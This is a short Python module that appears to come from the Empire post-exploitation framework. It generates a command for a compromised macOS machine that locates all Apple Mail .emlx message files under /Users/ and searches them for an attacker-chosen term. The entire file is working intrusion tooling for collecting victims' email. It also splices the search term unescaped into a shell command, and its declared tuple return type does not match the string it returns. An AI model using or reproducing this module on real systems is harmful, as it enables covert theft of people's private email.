from typing import Dict, Optional, Tuple

from empire.server.core.module_models import EmpireModule


class Module:
    @staticmethod
    def generate(
        main_menu,
        module: EmpireModule,
        params: Dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ) -> Tuple[Optional[str], Optional[str]]:
        searchTerm = params["SearchTerm"]

        script = 'cmd = "find /Users/ -name *.emlx 2>/dev/null'

        if searchTerm != "":
            script += "|xargs grep -i '" + searchTerm + "'\""
        else:
            script += '"'

        script += "\nrun_command(cmd)"

        return script
